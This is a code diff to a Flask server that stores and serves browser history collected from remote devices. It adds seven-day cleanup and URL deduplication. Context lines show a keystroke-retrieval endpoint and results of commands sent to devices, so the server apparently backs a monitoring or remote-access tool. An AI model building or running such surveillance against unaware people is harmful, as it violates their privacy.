@@ -1368,6 +1368,16 @@ def receive_browser_history():
 
     print(f"[{datetime.now().isoformat()}] 📥 Receiving {len(history)} browser history entries for device {device_id}")
 
+    # Optional: Clear old history entries older than 7 days to prevent database bloat
+    from datetime import timedelta
+    seven_days_ago = datetime.now() - timedelta(days=7)
+    deleted = db["browser_history"].delete_many({
+        "device_id": device_id,
+        "created_at": {"$lt": seven_days_ago}
+    })
+    if deleted.deleted_count > 0:
+        print(f"[{datetime.now().isoformat()}] 🧹 Cleaned up {deleted.deleted_count} old history entries (>7 days)")
+
     entries = []
     for item in history:
         if not isinstance(item, dict):
@@ -1991,27 +2001,35 @@ def get_keystrokes(device_id):
 @app.route('/api/history/<device_id>', methods=['GET'])
 @login_required
 def get_browser_history(device_id):
-    """Get browser history for a device"""
+    """Get browser history for a device - deduplicated and sorted by visit time"""
     # Verify access
     if not verify_device_access(device_id):
         print(f"[{datetime.now().isoformat()}] ⚠️ Unauthorized access attempt to device: {device_id} by user: {session.get('user_id')}")
         return jsonify({"error": "Unauthorized: You don't have access to this device"}), 403
 
-    history = []
+    # Get recent history entries from database
     history_docs = list(db["browser_history"].find(
-        {"device_id": device_id}
-    ).sort("created_at", -1).limit(50))
+        {"device_id": device_id, "visited_at": {"$ne": None}}
+    ).limit(200))  # Get more entries for deduplication
 
     print(f"[{datetime.now().isoformat()}] 📖 Fetching browser history for device {device_id} - found {len(history_docs)} entries")
 
+    # Deduplicate by URL (keep most recent visit)
+    seen_urls = {}
     for doc in history_docs:
-        history.append({
-            "url": doc.get("url"),
-            "title": doc.get("title"),
-            "visited_at": doc.get("visited_at"),
-            "browser": doc.get("browser"),
-            "created_at": str(doc.get("created_at", ""))
-        })
+        url = doc.get("url")
+        visited_at = doc.get("visited_at")
+        if url and visited_at:
+            if url not in seen_urls or visited_at > seen_urls[url]["visited_at"]:
+                seen_urls[url] = {
+                    "url": url,
+                    "title": doc.get("title"),
+                    "visited_at": visited_at,
+                    "browser": doc.get("browser"),
+                }
+
+    # Sort by visit time (most recent first) and limit to 50
+    history = sorted(seen_urls.values(), key=lambda x: x["visited_at"], reverse=True)[:50]
 
     if not history:
         print(f"[{datetime.now().isoformat()}] ⚠️ No browser history in DB for {device_id}, checking command results...")
@@ -2022,15 +2040,20 @@ def get_browser_history(device_id):
         if cmd_doc and isinstance(cmd_doc.get("result"), dict):
             print(f"[{datetime.now().isoformat()}] ✅ Found history in command result")
             data = cmd_doc.get("result", {}).get("data") or []
+            seen_fallback = {}
             for entry in data:
                 if isinstance(entry, dict):
-                    history.append({
-                        "url": entry.get("url"),
-                        "title": entry.get("title"),
-                        "visited_at": entry.get("visited_at"),
-                        "browser": entry.get("browser"),
-                        "created_at": str(cmd_doc.get("result_received_at") or cmd_doc.get("created_at", ""))
-                    })
+                    url = entry.get("url")
+                    visited_at = entry.get("visited_at")
+                    if url and visited_at:
+                        if url not in seen_fallback or visited_at > seen_fallback[url]["visited_at"]:
+                            seen_fallback[url] = {
+                                "url": url,
+                                "title": entry.get("title"),
+                                "visited_at": visited_at,
+                                "browser": entry.get("browser"),
+                            }
+            history = sorted(seen_fallback.values(), key=lambda x: x.get("visited_at", ""), reverse=True)[:50]
 
     print(f"[{datetime.now().isoformat()}] 📜 Browser history retrieved for device: {device_id} ({len(history)} entries)")
     return jsonify(history)
